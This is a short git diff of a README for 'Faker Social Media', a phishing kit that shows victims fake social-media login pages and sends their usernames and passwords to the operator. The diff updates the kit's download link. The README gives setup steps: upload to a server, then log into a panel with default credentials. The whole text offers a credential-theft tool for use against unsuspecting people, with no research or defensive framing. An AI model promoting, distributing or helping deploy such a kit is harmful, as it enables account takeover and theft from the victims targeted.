@@ -7,11 +7,11 @@
 Faker Social Media is a system that receives passwords by providing a fake interface to users.
 You send the internet url to the victim whose password you want to get. After entering the victim username and password and clicking the login button, the password comes directly to you.  <br/>
 
-[Download Faker Social Media](app.berkekurnaz.com/faker01.zip) <br/>
+[Download Faker Social Media](http://app.berkekurnaz.com/faker01.zip) <br/>
 
 ## How To Install
 
-1-) Download link on link below <br/> [Download Faker Social Media](https://pages.github.com/) <br/>`app.berkekurnaz.com/faker01.zip` <br/>
+1-) Download link on link below <br/> [Download Faker Social Media](http://app.berkekurnaz.com/faker01.zip) <br/>`app.berkekurnaz.com/faker01.zip` <br/>
 2-) Upload the downloaded file to your server <br/>
 3-) Go to `www.yoursite.com/Panel/Login` and log in by typing `admin` as the user name, `1111` in the password. <br/> 
 4-) Activate the social media of your choice. <br/>
